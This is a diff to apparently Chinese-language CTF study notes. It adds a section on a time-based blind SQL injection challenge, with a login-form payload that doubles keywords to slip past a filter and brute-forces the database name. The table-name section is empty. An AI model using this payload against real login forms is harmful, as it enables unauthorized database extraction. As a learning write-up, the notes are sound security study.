@@ -1014,3 +1014,13 @@ gobuster进行目录扫描：
 ![[Pasted image 20240311122534.png]]
 扫到一个/bin目录，访问，拿到所需的BrainPan.exe：
 ![[Pasted image 20240311122616.png]]
+[嘤嘤嘤]timesql #SQL注入漏洞 时间盲注
+爆数据库名
+```
+username=114514' oorr iiff(subsubstrstr(database(),§1§,1)='§z§',slesleepep(5),3)--+&password=114514
+```
+![[Pasted image 20240327161324.png]]
+爆表名
+```
+
+```
